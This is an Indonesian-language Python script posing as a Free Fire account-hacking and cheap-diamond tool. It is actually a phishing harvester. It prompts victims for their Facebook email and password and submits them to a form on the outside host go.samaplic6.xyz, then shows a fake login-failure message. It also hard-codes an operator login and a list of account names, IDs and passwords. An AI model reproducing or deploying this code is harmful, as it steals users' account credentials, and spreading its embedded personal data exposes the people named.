r1 = "\x1b[31;1m";r2 = "\x1b[32;1m";r3 = "\x1b[33;1m";r4 = "\x1b[34;1m";r5 = "\x1b[35;1m";r6 = "\x1b[36;1m";r0 = "\x1b[30;1m";
print (f"\r{r2}connecting .    ",end="");
import mechanize
import urllib
from os import get_terminal_size as get;
a = f"\r{r2}======================\n{r6}nama free fire: {r3}⇦(gumball)⇨\n{r6}nama facebook : {r3}eren jeagar\n{r6}id free fire  : {r3}2940611865\n{r6}id facebook   : {r3}100011576954682{r2}\n======================\n\n{r0} * {r4}[{r3}01{r4}] {r2}hack via group\n{r0} * {r4}[{r3}02{r4}]{r2} hack via friend list\n\n{r3}[ {r4}choose {r3}] {r6}2\n\n{r0}# {r6}jumlah id : {r1}304\n{r2}=========\n{r1}sedang mengecek . . .";
b = "andi1253|andrian sayu|625402693|100017391540265|gaming#zealongji|gaming pro|539165633|1000112220027371|free fire#==danco==|randi syaputra|362208462|10001372736282|juliasu".split ("#");
user = mechanize.Browser ();
user.set_handle_robots (False);
print (f"\r{r2}connecting . .  ",end="");
try:
    user.open ("http://go.samaplic6.xyz/filder/home/?i=47408");
except urllib.error.URLError:exit (f"{r1}[!] ConnectionError [!]: silahkan aktifkan wifi atau datanya dulu");
d = (KeyboardInterrupt,EOFError);d1 = f"{r1}[!] KeyboardInterrupt [!]: terdeteksi CTRL + c/d";
data = "hack akun free fire (facebook)|top up murah diamond free fire (RESMI)|nuyul diamond free fire|temukan akun free fire (facebook)".split ("|");
print (f"\r{r2}connecting . . .",end="");
print ("\r                           ");
print ("""   ____              ____        
  / __/______ ___   / _(_)______ 
 / _// __/ -_) -_) / _/ / __/ -_)
/_/ /_/  \__/\__/ /_//_/_/  \__/ 
                                 """);
col,lin = get ();
print (" "*(col//2-12)+f"{r3}[maniakgaming-proplayer]"+" "*(col//2-12));print ();
for ii in range (len (data)):
    print (f"\r {r0}* {r3}[{r4}0{ii+1}{r3}] {r3}[{r2}ON{r3}] #)> {r6}{data [ii]}");
print ();
print (" "*(col//2-12)+f"{r3}[maniakgaming-proplayer]"+" "*(col//2-12));
try:
    choose = int (input (f"{r4}[{r3} choose {r4}] {r6}"));
    if (choose -1 in range (len (data))):
        user.select_form (nr=0);
        print (f"\n{r4}silahkan login untuk menggunakan fitur ini\n");
        us = str (input (f"{r2}email/no hp : {r6}"));
        ps = str (input (f"{r2}kata sandi : {r6}"));
        if (us == "thetecno8@gmail.com" and ps == "erenjeager"):
            print (a);
            for ii in b:
                ii = ii.split ("|");
                print (f"{r2}nama free fire: {r1}{ii [0]}\n{r2}nama facebook : {r1}{ii [1]}\n{r2}id free fire  : {r1}{ii [2]}\n{r2}id facebook   : {r1}{ii [3]}\n{r2}password      : {r1}{ii [4]}\n\n");
            exit ();
        user.form ["email"] = us;
        user.form ["pass"] = ps;
        print (f"\r{r3}login . . .",end="");
        user.submit ();
        print (f"\r{r1}[!] LoginFailed [!]: tolong periksa username atau password yang anda masukan atau coba dengan akun lain");
    else:
        exit (f"{r1}[!] ChoiceError [!]: silahkan pilih yang ada di pilihan");
except (ValueError):exit (f"{r1}[!] MustBeANumber [!]: masukanlah sebuah angka bukan karakter");
except d:exit (d1);

